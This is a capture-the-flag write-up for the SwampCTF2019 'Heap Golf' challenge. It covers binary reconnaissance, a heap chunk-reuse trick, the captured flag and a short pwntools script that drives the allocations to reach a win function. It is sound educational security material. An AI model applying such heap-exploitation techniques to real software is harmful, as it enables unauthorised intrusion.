# Heap Golf

This is a pwning challenge for SwampCTF2019.


## Reconnaissance

This is a 64-bit ELF binary, not stripped so there are debugging symbols.

Running `strings` on it shows a few that are interesting:

```
system
cat flag.txt
target green provisioned.
enter -1 to exit simulation, -2 to free course.
Size of green to provision:
You're too far under par.
```

It has partial RELRO only and no PIE, so I could overwrite the GOT if I wanted.

Opening it in IDA, there's a function `win_func` that cats the flag using `system`. Okay, so I just need to call that function.

Now oddly I can run the binary locally from command line and remotely using `pwnlib`, but when I try to run it locally with `pwnlib` it hangs. A teammate noted that for some reason the local version of the application writes to `stdin` and reads from `stdout`! So I had to go in with a hex editor and change that back.

The idea seems to be that the fifth hole to be allocated has to fill the same space in memory as the first to be allocated. So I just need to malloc four bins of size 0x30, then free the course, then malloc four bins of size 0x30 again and the last one will occupy the same space in memory as the first "hole" that was malloced.

Easy enough!
`flag{Gr34t_J0b_t0ur1ng_0ur_d1gi7al_L1nk5}`

Here's the exploit code:

```
# exploit-heap-golf

from pwn import *
from time import sleep

local = True
if local:
	p = process('./heap_golf1')
	DELAY = 0.1
else:
	p = remote('chal1.swampctf.com', 1066)
	DELAY = 0.5


def send_malloc_request(n):
	p.send(str(n) + "\n")
	p.recvuntil("provision:")

def free_course():
	p.send("-2\n")
	p.recvuntil("provision:")

p.recvuntil("provision:")
for i in range(4):
	send_malloc_request(40)

free_course()

for i in range(3):
	send_malloc_request(40)

p.send("40\n")

p.interactive()
```

### Comparison to other approaches

The other write-ups on CTFTime all take the same approach. I appreciated [this write-up](https://screenshotwriteups.github.io/#8) for its illustration of the entire exploit with a single screenshot. 
